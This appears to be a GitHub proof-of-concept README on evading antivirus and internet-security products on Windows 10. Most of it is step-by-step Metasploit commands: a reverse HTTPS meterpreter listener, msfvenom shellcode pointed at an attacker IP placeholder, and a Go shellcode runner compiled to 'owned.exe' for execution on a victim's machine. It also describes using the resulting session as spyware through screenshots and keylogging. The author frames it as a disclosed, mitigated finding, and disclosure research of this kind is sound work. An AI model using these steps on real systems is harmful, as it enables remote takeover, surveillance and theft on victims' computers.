# Internet-Security-Bypass-Proof-of-Concept
At the time of discovery, this PoC worked on all major Internet Security/AV vendors. Nevertheless, I submitted the report to only one of the vendors (with a none disclosure policy) on 08/10/2020 and the vulnerability has been mitigated. Also, the vulnerability was only tested on Windows 10 x64 machine.


## Prerequisites/Requirements:
- [A Go program to run the shellcode](https://github.com/brimstone/go-shellcode)
- [Metasploit-framework](https://www.metasploit.com/)
- PostgreSQL (optional)
- Docker (optional)
- An IDE

## Write-up:
We need (at least) two docker containers instances running Metasploit-framework, one will be used for our reverse HTTPS payload generation (using msfvenom), the other will be used for our meterpreter listener (using msfconsole). 

If/When we place our payload in the Go code, compile, and run the .exe on the victim's machine, we will get a reverse shell on our attacker's computer. With that, we own the victim's system. We can use the meterpreter directly as a spyware (i.e. taking screenshots, keylogging, ...), run powershell scripts or cmd commands. Basically, we have more control over the victim's machine than the victim itself. 

## Setting up Metasploit console for our listener:
###### Although there are several ways to achieve these steps, I'm only adding them for completeness.

- On our attacker's machine (which is a a linux machine in this case), make directory for our metasploit-framework:
  - $mkdir ${HOME}/.msf4
  - $mkdir ${HOME}/.msf4/database

- Creating a Docker network for our operation:
  - $sudo docker network create --subnet=172.18.0.0/16 metasploit_network

- Lunch PostgreSQL database:
  - sudo docker run --ip 172.18.0.2 --network metasploit_network --name msf_pg_database -v "${HOME}/.msf4/database:/var/lib/postgresql/data" -e POSTGRES_PASSWORD=your_msfdb_password -e POSTGRES_USER=your_msfdb_user -e POSTGRES_DB=msf_database -d -p 5432:5432 --restart unless-stopped postgres:13-alpine

- From Metasploit-framework, lunch "msfconsole":
  - sudo docker run -it --network metasploit_network --ip 172.18.0.13 --name metasploit_framework -e DATABASE_URL='postgres://your_msfdb_user:your_msfdb_password@172.18.0.2:5432/msf_database' -v "${HOME}/.msf4:/home/msf4/.msf4" -p 8444:8444 --restart unless-stopped metasploitframework/metasploit-framework
    ##### The above command will land us in msfconsole, which is where we will set up our listener:
     - msf6> use exploit/multi/handler
     - msf6 exploit(multi/handler> set payload windows/x64/metepreter/reverse_https
     - msf6 exploit(multi/handler> set LPORT 8444
     - msf6 exploit(multi/handler> set LHOST YOUR_ATTACKERS_IP_ADDRESS
     - msf6 exploit(multi/handler> set EXITFUNC thread
     - msf6 exploit(multi/handler> set ExitOnSession false
     - msf6 exploit(multi/handler> exploit -j -s
    ##### Now that our listener is up and running, let's generate our payload.
    
## Steps to payload generation:
- Lunch another instance of metasploit_framework container:
  - $sudo docker exec -it metasploit_framework bash

- Generate our payload (using msfvenom):
  - ./msfvenom -p windows/x64/metepreter/reverse_https LHOST=YOUR_ATTACHERS_IP_ADDRESS LPORT=8444 -b '\x00' -i 2 -f hex
    ##### This will generate a payload/shellcode that we will later use in our gocode. I will not go into details on what each of those commands imply. Please refer to [Metasploit framework site](https://docs.rapid7.com/metasploit/msf-overview/) for comprehensive understanding of the framework.

- Put the shellcode in the [go code](https://github.com/brimstone/go-shellcode) and compile it:
  - $GOOS=windows GOARCH=amd64 go build -o owned.exe 
    ##### Notice that the code used command-line arguments instead. That didn't work at the time of research. The code had to be refactored so that we can embed the payload into the code for the bypass to work. In other words, a little understanding of Go programming language is required.
    
- Move the exe file to our victim's machine and execute:
  - ./owned.exe
    ##### Our listener (on our attacher's machine) should now have access to the victim's machine and ready to control the victim's machine.
    
### Additional Information:

Metasploit is a framework with collection of several exploits.

It is a breeze to lunch Metasploit on docker. I find it complicated to run directly on a Linux machine, and don't bother attempting running it on windows.

We do not need PostgreSQL for our demo, but without a database connection, our msfconsole might misbehave. 

To really understand the underlying concept of this bypass, some low-level understanding of Windows API/syscalls is also recommended. Here, we used the [VirtualProtect](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect). 

### Reference:
- [Metasploit-framework](https://www.metasploit.com/)
- [The Go programming language](https://golang.org/)
- [A Go program to run the shellcode](https://github.com/brimstone/go-shellcode)
- [PostgreSQL](https://www.postgresql.org/)
- [Docker](https://www.docker.com/)
- [Windows API](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
